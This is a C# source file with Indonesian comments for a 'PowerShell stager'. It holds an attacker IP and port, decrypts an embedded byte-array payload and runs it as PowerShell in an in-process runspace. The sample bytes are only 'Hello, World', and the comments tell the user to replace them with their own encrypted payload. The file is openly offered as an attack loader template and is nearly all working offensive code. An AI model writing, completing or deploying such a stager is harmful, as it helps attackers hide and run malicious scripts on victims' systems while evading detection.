// Kompilasi manual:
// csc /reference:/opt/microsoft/powershell/7/System.Management.Automation.dll,/usr/lib/mono/4.5.1-api/Facades/System.Runtime.dll /out:Stager.dll Stager.cs 

using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace PowerShellStager
{
    class Program
    {
        static void Main(string[] args)
        {
            // Konfigurasi informasi penyerang
            // IP dan Port berikut adalah alamat dan port dari server penyerang yang digunakan dalam serangan ini
            string attackerIP = "192.168.1.1";
            int attackerPort = 4444;

            // Payload terenkripsi (perlu diganti dengan payload yang dienkripsi milik Anda)
            // Payload di bawah ini adalah contoh data terenkripsi dalam bentuk byte array yang nantinya akan didekripsi dan dijalankan
            byte[] encryptedPayload = { 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x2C, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64 };

            // Dekripsi dan jalankan payload
            try
            {
                byte[] decryptedPayload = DecryptPayload(encryptedPayload); // Proses dekripsi payload
                ExecutePayload(decryptedPayload); // Jalankan payload setelah berhasil didekripsi
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Gagal mendekripsi dan menjalankan payload: {ex.Message}");
            }
        }

        // Fungsi untuk mendekripsi payload
        static byte[] DecryptPayload(byte[] encryptedPayload)
        {
            // Implementasikan algoritma dekripsi Anda di sini
            // Contoh implementasi dekripsi menggunakan XOR (ganti sesuai kebutuhan):
            // byte[] decryptedPayload = new byte[encryptedPayload.Length];
            // for (int i = 0; i < encryptedPayload.Length; i++)
            // {
            //     decryptedPayload[i] = (byte)(encryptedPayload[i] ^ 0xFF); // XOR dengan nilai 0xFF
            // }
            // return decryptedPayload;

            // Untuk demonstrasi, kembalikan payload terenkripsi tanpa dekripsi
            return encryptedPayload;
        }

        // Fungsi untuk mengeksekusi payload setelah didekripsi
        static void ExecutePayload(byte[] payload)
        {
            // Konversi array byte ke dalam script PowerShell dalam bentuk string
            string script = Encoding.ASCII.GetString(payload);

            // Membuat runspace PowerShell, yang merupakan lingkungan untuk menjalankan script PowerShell
            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.Open(); // Buka runspace

                // Membuat pipeline, lalu masukkan script yang akan dieksekusi ke dalam pipeline
                Pipeline pipeline = runspace.CreatePipeline();
                pipeline.Commands.AddScript(script); // Menambahkan script ke pipeline

                // Eksekusi script yang ada di pipeline
                try
                {
                    pipeline.Invoke(); // Jalankan script
                    Console.WriteLine("Payload berhasil dijalankan.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Gagal mengeksekusi payload: {ex.Message}");
                }
            }
        }
    }
}
